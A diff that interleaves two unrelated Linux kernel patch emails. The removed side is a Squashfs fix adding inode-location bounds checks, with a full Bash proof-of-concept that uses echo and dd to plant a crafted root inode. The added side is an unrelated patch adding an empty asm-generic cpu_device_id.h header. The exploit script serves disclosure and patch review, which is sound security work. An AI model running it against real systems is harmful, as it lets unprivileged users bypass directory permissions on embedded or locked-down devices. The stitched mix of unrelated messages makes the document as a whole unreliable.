@@ -1,80 +1,96 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.33
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=192.198.163.9
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1794440697;
-	b=QA3c9fpY4vqjIaoiFt5BkVnpTXHcPspa+g1cQY8SdNEwX4BluuGAL3u1KlZHhOa4+UBN
-	 LDHP8tfZWDH3O1mAOEu6yE2MW+UpjFWQUVCuxqQ9Fa1kAUwKqJR7dmSvIE+9dMZwe4bWl
-	 dKFF1ATce44t1reN90Xd69Rk6B03MhwxdI8J4xKwKXLWUZeyRFyuNTB6KNSf7QEvvzOaN
-	 5IvdCmqhAkVvaSlQhtOn52IU8BTsU7JE2VdjWwCzcknjkFWMhpoW4I4DdFMpOoi9xAppS
-	 1Kc92qB2FUniLoL63SwtMn0sSp+KcABritdSGriCu4H1pfZxndOwF9X509YqjARQdXw==
+	t=1794440687;
+	b=TrFmthm7fz1qj6Khw4D+NHvD72kViI7lgJVl7gvYaS96FkRNmM0KhwPex1h1KpTet9dB
+	 Mx5atx7D5lxVZUA6EL1bQS4Ef8OQg1FBUT8dJ7Bf7r3+y+o/ffMs7nfy2aIKkKM1meXDq
+	 9mR4ocYUfQERgxtM7Ml1qyfAmBprdSxLypcAt1LU73zxBkoZRPa0Enf9O8gLAm27gjWbn
+	 XqDpUge549vBRjrRpCMoYUcqo8ne7qBagG06g9xcmrtLKyij5iv+aUhLevmZ/oHMfA0Wv
+	 gtVkjXIGPH4Xuf14EfCEqYfh7rRkXjBUhOycAM96uM0aCwT2eItwm3agKQHg1m+HZuQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1794440697;
-	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
-	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
-	 X-Mailer:In-Reply-To:References:MIME-Version:
-	 Content-Transfer-Encoding:X-CMAE-Envelope;
-	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
-	b=2/UrARYleo1iu/SCATfydZYoF6XVIvgfZcuhIdxN3RASWo8CcFBC8YEPAWMtaenOr3YV
-	 obVa9xGrEdPUBDRtgxM7+H0SjeVonvfIlljUA0RjWBv+UMSWsOXGnTlsxcHDJrIZpRSys
-	 2+ZZNUq1d/0or5YmDlLuOwe6NDQmvHNFKkFeUZNlNkyg+kDrCcdPSezywWVNP1xvezvUD
-	 rInWLWe5l2v7Imzve+RipRgJiV711semUNF6G6eJz6NjsAH9Y+mbkS4bj3zkt9rc95gCb
-	 gnhmV9LAPv11SjdNAtrkjOp959lpTSsKyLF8P3er+cPDMAWeD+fTnGYiN9Sf1H27MWQ==
+	a=rsa-sha256; c=relaxed/relaxed; t=1794440687;
+	h=DMARC-Filter:DKIM-Signature:X-CSE-ConnectionGUID:X-CSE-MsgGUID:
+	 X-IronPort-AV:X-IronPort-AV:Received:X-CSE-ConnectionGUID:
+	 X-CSE-MsgGUID:X-ExtLoop1:X-IronPort-AV:Received:From:To:Cc:Subject:
+	 Date:Message-ID:X-Mailer:In-Reply-To:References:MIME-Version:
+	 Content-Transfer-Encoding;
+	bh=sdSp4JAEBIO1pQeZZS71rX8i5HCrtwFNUZ7pCreT77A=;
+	b=Oks4l0ApARf/fxMhhBAJ7lsdrbO/JPa0BxQNAFduOkH3c7RxQdDJjQNfoT+su8KnSYMv
+	 ggZFj2TaHb9JtyWTW4ei6OwBJldet8i78x4+COe10R+jZSpoBLu9e9BL1w7m87d2qPwi7
+	 /oCLpTNX7C+PjYTgUNJs0gcR2XNYQsp14bjJ2Fxba8cuUFZmYxa5TyQFvIenP1udGDsJI
+	 pw/BdzGNIrNK8RIhJEj7DIebi3ZPhLnBTnAmN55jxMUO1K4SqNEtKUKgOHP0KHtcfEv4g
+	 0gej9KKI8GybeFR/qlB77fZ+G7Ap0A36v8v/CtvjPy/xM1GHewrJ8KWHGUQxwing8lQ==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=squashfs.org.uk;
-	spf=pass smtp.mailfrom=squashfs.org.uk;
-	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OBbun7zb;
-	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=TpUFPFyR;
-	arc=none smtp.remote-ip=188.121.53.33
-Received: from sxplsmtpa04-03.prod.sxb1.secureserver.net (sxplsmtpa04-03.prod.sxb1.secureserver.net [188.121.53.33])
-	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
-	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
+	dmarc=pass header.from=intel.com;
+	spf=pass smtp.mailfrom=intel.com;
+	dkim=pass header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=gA7gYbT9;
+	arc=none smtp.remote-ip=192.198.163.9
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.9])
+	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 69C6C606F734
-	for <linux-kernel@vger.kernel.org>; Wed, 11 Nov 2026 23:44:56 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 69C6C606F734
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7A9D2606A89A;
+	Wed, 11 Nov 2026 23:44:43 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 7A9D2606A89A
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=OBbun7zb;
-	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=TpUFPFyR
-Received: from avalon.fritz.box ([82.69.79.175])
-	by :SMTPAUTH: with ESMTPA
-	id RHz6xtxIpLwCURHzdxAFYU; Wed, 11 Nov 2026 23:44:42 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
-	s=secureserver2; t=1794440683;
-	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=OBbun7zbb86v3dHwHuZs9re8w1OoS7tvydEfYlswnTfBm/w819nMVa5fXydGXk9Am
-	 X1MFIO3kOHklbbi6xaWF3uiXcVymNUT38TJ6NuIhJ2nGH+LrBTbcVXKz+RK8b6uFRB
-	 vpXE6kDS+DDAdd2FQd0GRzOiIsJfKMspS7byyC3aO3gqp0W3SFYe71zUkL4FieYvCp
-	 /7VUCrHSQuyGZ9m3aeVD2SqSM2jryWuyuX0/OO/8t7WEOismxQpr3cPA0xJKOpWaop
-	 Ur2hOEYE1z3veWbUrrVoTeJQ8B1BLzTotFh6LjXvhFYNN6EEfcXmzqBvRZ/6eAAhfh
-	 qPAOZHY6U9keQ==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
-	s=secureserver1; t=1794440683;
-	bh=lazIMP3VfO3rf0+sfKNzR2f4fSgQ2+BI+PlfexNAqoM=;
-	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=TpUFPFyR7aWmaqX13pttmDAMIiHxOs8Ftz8FHgFymfOsS2cNMnKOz1dT/k3O8uSyz
-	 s+o9++Pa/78YdqRuVS9AtAkWq4vt2vGCu0hq0QPgVQDmNHpDxtfXap/i2cm31W91b5
-	 oZTobzbd5L1D+vk2Q57+dFvnbEi3jEOoApNUEObgzdKu954qqvKB4SxqYCsgTgHJdA
-	 fbB5BHqp4s74GrdQri+TQzhsf5gIQ5AcCc6WY0wG3LvXJRoh6clYNNlkivmTqM430q
-	 iG296wxDyaIRkkPZLvKIoNMXZjbi/lwnlINxMF62oGcLVNXqwhUpCBGuTtrunjtj7E
-	 AVsV9j9HQLbJg==
-X-CMAE-Analysis: v=2.4 cv=XZYcX455 c=1 sm=1 tr=0 ts=6af4fdea
- a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
- a=WbH0joDL9KXNTEjrqjoA:9 a=UObqyxdv-6Yh2QiB9mM_:22
-Feedback-ID: 04410ff6f47df6991b1c3c0d7eb3a576:squashfs.org.uk:ssnet
-X-SECURESERVER-ACCT: phillip@squashfs.org.uk
-From: Phillip Lougher <phillip@squashfs.org.uk>
-To: linux-kernel@vger.kernel.org,
-	linux-fsdevel@vger.kernel.org,
-	akpm@linux-foundation.org
-Cc: Phillip Lougher <phillip@squashfs.org.uk>
-Subject: [PATCH v2 10/22] Squashfs: sanity check inode metadata block location
-Date: Wed, 11 Nov 2026 23:43:50 +0000
-Message-ID: <20261111234402.252354-11-phillip@squashfs.org.uk>
-X-Mailer: git-send-email 2.47.3
-In-Reply-To: <20261111234402.252354-1-phillip@squashfs.org.uk>
-References: <20261111234402.252354-1-phillip@squashfs.org.uk>
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.a=rsa-sha256 header.s=Intel header.b=gA7gYbT9
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1794440684; x=1825976684;
+  h=from:to:cc:subject:date:message-id:in-reply-to:
+   references:mime-version:content-transfer-encoding;
+  bh=dj125zGEvAXWXtzneUQm2Fo30+JV1EKjt/TJ4mkqfhI=;
+  b=gA7gYbT9Pvw4OdGs+xH/J8FAORiqXLchVkKEmLBURxkb5ObfL1reGme5
+   pkUQfNJWOMcA9rWi8DJcjJ8DvMAPZ/DZ8Z7Yt7TQKLwHRuy2pnJaOiOh0
+   jkxRyKsTES31Lv+cb4NYVQsnwxpRPANrk8KcKjW2Og1dulIV2NK+R73ji
+   2sE6pAE7HQoN4ou0UccY3xQ7lYml1ERxIZZmWch6Ab9ucCd5N1jwp5rpK
+   3GR9P6H/QOj/p1ZaRxDHF8DaiO0DDlRWtluxTqIqrlx1FA1AQiH1Kzcuq
+   o8L2b0i/Qc4QbODafAh773JXcj9F2NoPzbNpt753PoAqA950bi3OCZSU6
+   A==;
+X-CSE-ConnectionGUID: e5Zx13UsSe68kJnDYOczWg==
+X-CSE-MsgGUID: fWLNpoetS4yHcrDjXraNAQ==
+X-IronPort-AV: E=McAfee;i="6800,10657,11963"; a="3099099"
+X-IronPort-AV: E=Sophos;i="6.27,208,1787036400"; 
+   d="scan'208";a="3099099"
+Received: from fmviesa012.fm.intel.com ([10.60.135.152])
+  by fmvoesa103.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 11 Nov 2026 15:44:43 -0800
+X-CSE-ConnectionGUID: kH3cqayDS3GUWnZAsbZHfA==
+X-CSE-MsgGUID: h2vE+jaoRUKLZ6aRiGD2fQ==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.27,208,1787036400"; 
+   d="scan'208";a="10241290"
+Received: from pavel-dev.sc.intel.com (HELO pepopov-mobl2.intel.com) ([10.3.206.11])
+  by fmviesa012.fm.intel.com with ESMTP; 11 Nov 2026 15:44:42 -0800
+From: Pavel Popov <pavel.e.popov@intel.com>
+To: Bjorn Helgaas <bhelgaas@google.com>,
+	Logan Gunthorpe <logang@deltatee.com>,
+	Arnd Bergmann <arnd@arndb.de>
+Cc: Pavel Popov <pavel.e.popov@intel.com>,
+	Leon Romanovsky <leon@kernel.org>,
+	Lukas Wunner <lukas@wunner.de>,
+	Thomas Gleixner <tglx@kernel.org>,
+	Ingo Molnar <mingo@redhat.com>,
+	Borislav Petkov <bp@alien8.de>,
+	Dave Hansen <dave.hansen@linux.intel.com>,
+	x86@kernel.org,
+	Jim Chow <jim.chow@broadcom.com>,
+	Radu Rugina <radu.rugina@broadcom.com>,
+	Alexey Makhalov <alexey.makhalov@broadcom.com>,
+	Wei Liu <wei.liu@kernel.org>,
+	Michael Kelley <mhklinux@outlook.com>,
+	Nathan Ciobanu <nathan.d.ciobanu@linux.intel.com>,
+	bcm-kernel-feedback-list@broadcom.com,
+	virtualization@lists.linux.dev,
+	linux-hyperv@vger.kernel.org,
+	linux-arch@vger.kernel.org,
+	linux-pci@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH v5 1/3] asm-generic: Add <asm-generic/cpu_device_id.h>
+Date: Wed, 11 Nov 2026 16:44:37 -0700
+Message-ID: <20261111234439.4098-2-pavel.e.popov@intel.com>
+X-Mailer: git-send-email 2.54.0
+In-Reply-To: <20261111234439.4098-1-pavel.e.popov@intel.com>
+References: <20261111234439.4098-1-pavel.e.popov@intel.com>
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -85,227 +101,47 @@ List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
-X-CMAE-Envelope: MS4xfOGqZ2fPwlWe9Ezc0J2dnxcGrCq3bhEaREgC5Yd0hzxw1v+4Z2dFqjalH+V2NSGYLLBsVbZmRhPl4iFLkpSGpN5xr8v9WdTDXub/S8prHf7o9hruEy9X
- tQ95A5F4Wkxp1wnQ2vdZ2UsXm5/S403t0Mq/1Xy61KHvGnPl0DQs7If/Z9ixgFa0/vOxxTvluUAB1Y+hBr7+C9Xvivrtu/gAadYtGOPLDUkssvQjMh4Sx/PF
- DDeirv/PI6J1594Rd2M0duzgQBX3NPsnabYFRSkP8jfD53P/RTEyKHUpu6nu/5rmqOpDtxv2Doc0Gb9fL+W4jvoX4dhCD9LwbrFt6CL9Pp8=
 
-An inode reference in Squashfs is represented as a tuple, the location
-of the compressed metadata block the inode is in, and the offset into
-the uncompressed block.  The location is not absolute and it is instead
-encoded as an offset from the start of the inode table.
+<asm/cpu_device_id.h> exists only on x86, so generic code that
+matches on x86 CPU models has to wrap the include in #ifdef
+CONFIG_X86.
 
-An attacker could manipulate the inode reference to make it point to a
-replacement malicious inode stored elsewhere, outside the inode table.
-This is because the code does not check that the location is valid and
-is within the inode table.
+Add an empty generic version, so the header can be included
+unconditionally. The CPU match tables themselves still need
+CONFIG_X86 for the model defines.
 
-In practice this exploit is hard to achieve because metadata in Squashfs
-is compressed by default, and so the compressed metadata cannot be
-directly altered.  In addition due to sanity checking at mount time
-there are no gaps in the filesystem to hide a malicious inode.
-
-Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
-the filesystem incorporating whatever changes they want.
-
-However there are a number of exploit scenarios here.  Many embedded
-systems or secure systems have deliberately restricted installations
-with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
-due to this bug can be achieved with only echo and dd.
-
-An example exploit is where a Squashfs filesystem root directory has
-permissions 0700 (u=rxw), where only the superuser can enter the
-directory and access the content within. But using this bug an attacker
-could place a malicious root inode in the inode lookup table (used by
-NFS) which has the permissions changed to 0777 (a=rwx), and then update
-the root_inode field in the superblock to point to that.  On
-reboot/remount this will make the directory accesisible to unprivileged
-users.
-
-The following shell script acts as a reproducer and proof of concept.
-
-This commit blocks such attempts by adding a new helper
-squashfs_inode_start() which adds additional sanity checking, first
-ensuring no arithmetic operations overflow, and second checking that
-the inode is within the inode table.
-
-Reproducer
-==========
-
-The following Bash script uses echo and dd to achieve the previously
-discussed exploit.  If the exploit is successful the root directory
-permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
-is unchanged.
-
-======================================================================
-#!/bin/bash
-
-ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"
-
-finish() {
-	popd 2>&1 > /dev/null
-	rm -rf $DIR
-	exit 1
-}
-
-DIR=$(mktemp -d)
-
-pushd $DIR 2>&1 > /dev/null
-
-# Create a Squashfs pseudo file which is fed to Mksquashfs
-echo Create a Squashfs pseudo file which is fed to Mksquashfs
-
-dd if=/dev/zero of=zero bs=1024 count=1 status=none
-for i in $(seq 1 100); do
-	echo "$i l zero" >> pseudo
-done
-
-# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
-echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"
-
-if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
-	echo Failed to create Squashfs filesystem
-	finish
-fi
-
-# The root_inode field in the superblock points to the compressed metadata
-# block and offset within it, where the root inode is stored.
-#
-# Create a malicious root inode and hide it in the inode lookup table.
-# Because of mount time checking, there are no gaps between metadata tables
-# where it can be hidden, and it can't be hidden after the file system end,
-# because this is checked.
-
-# Write malicious inode, this is the same as the original root inode, except
-# it is uncompressed, and the permissions are set to 0777.
-/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
-\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
-\x00" > file
-
-# Place new root inode inside the inode lookup table
-echo Place new root inode inside the inode lookup table
-
-dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none
-
-# Update the root_inode field in the superblock to point to our new inode
-# The start block is an offset from the inode_table_start, and not an
-# absolute value.  The start of the inode table is 113, the new inode
-# is placed at position 964, and so the offset is 851. Because we've only
-# stored one inode in the metadata block, the offset into that block is 0.
-#
-echo Update the root_inode field in the superblock to point to our new inode
-
-/usr/bin/echo -en "\x00\x00\x4f\x03" > file
-
-dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none
-
-# Mount the filesystem to /mnt
-echo Mount the filesystem to /mnt
-
-if ! mount -t squashfs img.sqsh /mnt; then
-	echo Mount of Squashfs filesystem failed
-	finish
-fi
-
-# Stat /mnt, if the exploit is successful, permissions should be 0777
-echo Stat /mnt, if the exploit is successful, permissions should be 0777
-
-stat /mnt
-
-popd 2>&1> /dev/null
-
-rm -rf $DIR
-======================================================================
-
-Fixes: 6545b246a2c8 ("Squashfs: inode operations")
-Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
+Suggested-by: Leon Romanovsky <leon@kernel.org>
+Link: https://lore.kernel.org/r/25a0cdb4-9c4f-4531-bdf2-8d09eedd0883@app.fastmail.com
+Signed-off-by: Pavel Popov <pavel.e.popov@intel.com>
 ---
-v2: ensure err is not used uninitialised.
----
- fs/squashfs/inode.c            | 17 ++++++++++-------
- fs/squashfs/squashfs_helpers.h | 18 ++++++++++++++++++
- 2 files changed, 28 insertions(+), 7 deletions(-)
+ include/asm-generic/Kbuild          | 1 +
+ include/asm-generic/cpu_device_id.h | 5 +++++
+ 2 files changed, 6 insertions(+)
+ create mode 100644 include/asm-generic/cpu_device_id.h
 
-diff --git a/fs/squashfs/inode.c b/fs/squashfs/inode.c
-index 66858fabed1a..547eb04f66bd 100644
---- a/fs/squashfs/inode.c
-+++ b/fs/squashfs/inode.c
-@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- {
- 	struct super_block *sb = inode->i_sb;
- 	struct squashfs_sb_info *msblk = sb->s_fs_info;
--	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
--	int offset = squashfs_inode_offset(ino);
-+	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
-+	int offset = squashfs_inode_offset(ino), soffset = offset;
- 	int err, type;
- 	union squashfs_inode squashfs_ino;
- 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
-@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- 
- 	TRACE("Entered squashfs_read_inode\n");
- 
-+	if (block < 0)
-+		goto bad_block_val;
+diff --git a/include/asm-generic/Kbuild b/include/asm-generic/Kbuild
+index b7a388bef6e..fad71809ffa 100644
+--- a/include/asm-generic/Kbuild
++++ b/include/asm-generic/Kbuild
+@@ -13,6 +13,7 @@ mandatory-y += cacheflush.h
+ mandatory-y += cfi.h
+ mandatory-y += checksum.h
+ mandatory-y += compat.h
++mandatory-y += cpu_device_id.h
+ mandatory-y += current.h
+ mandatory-y += delay.h
+ mandatory-y += device.h
+diff --git a/include/asm-generic/cpu_device_id.h b/include/asm-generic/cpu_device_id.h
+new file mode 100644
+index 00000000000..05c38c3ca1d
+--- /dev/null
++++ b/include/asm-generic/cpu_device_id.h
+@@ -0,0 +1,5 @@
++/* SPDX-License-Identifier: GPL-2.0 */
++#ifndef _ASM_GENERIC_CPU_DEVICE_ID_H
++#define _ASM_GENERIC_CPU_DEVICE_ID_H
 +
- 	/*
- 	 * Read inode base common to all inode types.
- 	 */
--	err = squashfs_read_metadata(sb, sqshb_ino, &block,
--				&offset, sizeof(*sqshb_ino));
-+	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
-+				&soffset, sizeof(*sqshb_ino));
- 	if (err < 0)
- 		goto failed_read;
- 
-@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- 	if (err)
- 		goto failed_read;
- 
--	block = squashfs_inode_blk(ino) + msblk->inode_table;
--	offset = squashfs_inode_offset(ino);
--
- 	type = le16_to_cpu(sqshb_ino->inode_type);
- 	switch (type) {
- 	case SQUASHFS_REG_TYPE: {
-@@ -452,6 +452,9 @@ int squashfs_read_inode(struct inode *inode, long long ino)
- 
- 	return 0;
- 
-+bad_block_val:
-+	err = block;
-+
- failed_read:
- 	ERROR("Unable to read inode 0x%llx\n", ino);
- 	return err;
-diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
-index 524d4a77686d..138173860f7c 100644
---- a/fs/squashfs/squashfs_helpers.h
-+++ b/fs/squashfs/squashfs_helpers.h
-@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(s64 inode)
- 	return inode & 0xffff;
- }
- 
-+static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
-+{
-+	s64 start;
-+
-+	if (inode < 0)
-+		return -EINVAL;
-+
-+	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
-+		return -EINVAL;
-+
-+	start = msblk->inode_table + squashfs_inode_blk(inode);
-+
-+	if (start > msblk->directory_table)
-+		return -EINVAL;
-+
-+	return start;
-+}
-+
- static inline s64 squashfs_mkinode(u32 start, u16 offset)
- {
- 	return ((s64)start << 16) | offset;
++#endif /* _ASM_GENERIC_CPU_DEVICE_ID_H */
 -- 
-2.47.3
+2.54.0
 
